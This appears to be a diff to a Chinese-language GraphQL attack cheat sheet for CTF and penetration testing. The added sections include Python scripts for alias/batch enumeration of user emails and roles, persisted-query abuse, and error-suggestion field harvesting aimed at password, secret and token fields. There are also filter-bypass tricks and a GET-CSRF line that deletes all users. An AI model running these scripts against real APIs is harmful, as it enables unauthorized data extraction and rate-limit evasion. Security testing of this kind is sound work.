@@ -14,7 +14,7 @@ keywords: ["GraphQL攻击", "introspection", "GraphQL注入", "batch query", "al
 difficulty: "intermediate"
 tags: ["injection", "graphql", "api", "web-security", "dos", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
+last_updated: "2026-07-04"
 related_articles: []
 ---
 
@@ -30,6 +30,22 @@ related_articles: []
 - 响应头: Content-Type: application/json
 - 报错含 "__typename" "Cannot query field" "GraphQLError"
 ```
+
+## 0. 传输层与解析器差异
+
+GraphQL 不只是一条 `POST /graphql`。同一个 resolver 可能被 JSON body、GET query、batch array、multipart upload、WebSocket subscription、persisted query 多种入口触发，过滤器经常只覆盖其中一种。
+
+| 入口 | 请求形态 | 打点动作 | 命中信号 |
+|---|---|---|---|
+| JSON POST | `{"query":"{__typename}"}` | 基础查询、mutation、variables | `data.__typename` |
+| GET | `/graphql?query={__typename}` | 测 cache、CSRF、URL decode 差异 | GET mutation 被执行 |
+| Batch array | `[{"query":"..."},{"query":"..."}]` | 单请求多 resolver | 返回 JSON 数组 |
+| Alias | `a:user(id:1){...}` | 同 resolver 多次执行 | 同响应里出现多个别名 |
+| Multipart | `operations` + `map` + file part | 文件上传 resolver | `Upload` scalar 或 multipart 错误 |
+| WebSocket | `connection_init` → `subscribe` | subscription / live query | `connection_ack` |
+| APQ | `extensions.persistedQuery` | hash lookup/注册 | `PersistedQueryNotFound` |
+
+先用 `{__typename}` 测入口，再切换 transport；如果 POST 被拦，GET、batch、APQ 经常还能触发同一 resolver。
 
 ## 1. Introspection 拖 Schema
 
@@ -105,6 +121,38 @@ otp_queries = [
 ]
 # 每 1000 条打包一次 send
 ```
+
+### A. Alias / Batch 生成器
+
+```python
+import json
+import requests
+
+def alias_query(field: str, ids: list[int], selection="id email role"):
+    body = ["query {"]
+    for i in ids:
+        body.append(f"  u{i}: {field}(id: {json.dumps(str(i))}) {{ {selection} }}")
+    body.append("}")
+    return "\n".join(body)
+
+def send_alias(endpoint, cookie, field="user", start=1, stop=50):
+    q = alias_query(field, list(range(start, stop + 1)))
+    r = requests.post(endpoint, json={"query": q}, headers={"Cookie": cookie})
+    print(r.status_code, r.text[:1000])
+
+def send_batch(endpoint, queries):
+    r = requests.post(endpoint, json=[{"query": q} for q in queries])
+    print(r.status_code)
+    print(r.text[:2000])
+
+send_alias("https://target/graphql", "session=xxx")
+```
+
+判断方式：
+
+- 如果别名全部返回但普通循环触发限制，说明限制绑定在 HTTP request 数。
+- 如果只返回前 N 个别名，说明服务端有 complexity/cost limiter，改用 batch array 或拆字段。
+- 如果 error path 带 `path:["u17","email"]`，可以直接定位哪个 id/字段触发权限差异。
 
 ## 4. Alias 滥用
 
@@ -219,6 +267,39 @@ POST /graphql HTTP/1.1
 # 可以发送同样的 hash + 完整 query 一起注册
 ```
 
+### A. APQ 注册/查找细节
+
+Apollo Persisted Query 常见状态：
+
+| 响应 | 含义 | 下一步 |
+|---|---|---|
+| `PersistedQueryNotFound` | hash 未注册 | 带同 hash + 完整 query 再发一次 |
+| `PersistedQueryNotSupported` | APQ 关闭 | 回普通 POST |
+| `sha256Hash does not match query` | hash 算错或服务端二次规范化 | 重新按原始 query 字节算 |
+| `data` 正常返回 | hash 命中 | 枚举历史 hash 或复用已知 query |
+
+```python
+import hashlib
+import requests
+
+def apq(endpoint, query, variables=None):
+    h = hashlib.sha256(query.encode()).hexdigest()
+    body = {
+        "operationName": None,
+        "variables": variables or {},
+        "extensions": {"persistedQuery": {"version": 1, "sha256Hash": h}},
+    }
+    r1 = requests.post(endpoint, json=body)
+    print("[lookup]", r1.text[:300])
+    body["query"] = query
+    r2 = requests.post(endpoint, json=body)
+    print("[register/execute]", r2.text[:1000])
+
+apq("https://target/graphql", "query { __typename }")
+```
+
+CTF 常见错配：网关按 hash 放行，后端仍执行 body 里的 `query`；或者缓存层只把 hash 作为 key，未把 `variables`、用户身份、租户字段纳入 key。
+
 ## 10. Field Suggestions 信息泄露
 
 ```bash
@@ -232,6 +313,32 @@ curl -s 'https://target.com/graphql' -H 'Content-Type: application/json' \
   -d '{"query":"{ users { doesnotexist } }"}' | jq '.errors[].message'
 ```
 
+### A. Suggestion 递归拖字段
+
+```python
+import re
+import requests
+
+SUG = re.compile(r"Did you mean ([^?]+)\\?")
+
+def suggestion_probe(endpoint, typename_path="users", seed="zzzzzz"):
+    q = f"query {{ {typename_path} {{ {seed} }} }}"
+    r = requests.post(endpoint, json={"query": q})
+    msg = " ".join(e.get("message", "") for e in r.json().get("errors", []))
+    m = SUG.search(msg)
+    if not m:
+        print(msg[:500])
+        return []
+    fields = re.findall(r"'([^']+)'", m.group(1))
+    print(typename_path, fields)
+    return fields
+
+for guess in ["id", "email", "password", "secret", "flag", "admin", "token"]:
+    suggestion_probe("https://target/graphql", "user(id:1)", guess + "x")
+```
+
+拿到字段名后不要只查当前类型：继续通过关联字段扩展 `user.posts.author.email`、`team.members.role`、`viewer.organization.secrets`。GraphQL 的越权经常出现在“顶层 resolver 鉴权，子字段 resolver 忘记鉴权”。
+
 ## 11. GET 方法 CSRF
 
 ```bash
@@ -239,6 +346,32 @@ curl -s 'https://target.com/graphql' -H 'Content-Type: application/json' \
 curl "https://target.com/graphql?query=mutation+%7B+deleteAllUsers+%7B+success+%7D+%7D"
 # → 可在 <img> 标签中触发，绕过 CORS/CSRF token
 ```
+
+## 12. Variables / Fragment 边界条件
+
+```graphql
+# 默认值混淆：服务端只校验 variables，实际 resolver 使用 query default
+query GetUser($id: ID = "1") {
+  user(id: $id) { id email role }
+}
+
+# 类型包装：ID/String/Int 在 resolver 中被 ORM 自动转换
+query {
+  user(id: "0001") { id email }
+  bySlug(slug: ["admin"]) { id }
+}
+
+# Fragment 复用：绕过“字段名出现次数”过滤
+fragment f on User { email role isAdmin }
+query { user(id: 1) { ...f ...f ...f } }
+```
+
+边界判断：
+
+- `Variable "$id" got invalid value`：GraphQL 类型层拦住了，还没进 resolver。
+- `Cannot return null for non-nullable field`：resolver 已执行，但下游数据或权限返回 null。
+- `path` 指向子字段：顶层对象拿到了，问题在字段 resolver。
+- `extensions.code` 为业务错误：已经越过 GraphQL parser，开始打业务逻辑。
 
 ---
 
@@ -262,9 +395,9 @@ python3 crackql.py -t https://target.com/graphql -q queries.graphql -w wordlist.
 
 ## Evidence
 
-记录: introspection/schema JSON、field suggestion 泄露的字段名、subscription 连接和消息、batch/alias 绕过请求/响应对
+记录: introspection/schema JSON、field suggestion 泄露字段名、transport 类型、operationName、variables、batch/alias 数量、subscription 连接消息、APQ hash 与响应、成功字段路径和失败样本。
 
-## 12. 攻击链
+## 13. 攻击链
 
 ```
 GraphQL Introspection → 完整 Schema → 发现 admin{flag} → 直接查询
